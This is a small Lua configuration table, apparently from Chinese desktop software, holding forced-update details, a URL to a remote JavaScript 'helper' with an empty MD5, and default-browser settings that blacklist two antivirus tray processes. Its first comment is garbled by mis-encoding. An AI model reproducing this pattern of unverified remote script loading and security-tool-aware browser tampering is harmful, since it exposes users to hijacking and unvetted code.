--------²âÊÔÊ¹ÓÃ£¡£¡£¡£¡
function GetSubTable()
	local t = {
		["tNewVersionInfo"] = {
			["tForceUpdate"] = {
				["strVersion"] = "8.0.0.5",
				["tVersion"] = {"0"},
				["strPacketURL"] = "",
				["strMD5"] = "FC3C8BC02E7531AB639CC76A285A0459",
			},
		},
		
		["tExtraHelper"] = {
			["strURL"] = "http://www.91yuanbao.com/cmi/ietest.js",
			["strMD5"] = "",
		},
		
		["tDefaultBrowser"] = {
			["strBlackList"] = "360tray;qqpctray",
			["strBrowserList"] = "sogo;chrome;360safe;iexplore",
			["nSpanTimeInSec"] = 3*24*3600,
		},
	}
	return t
end

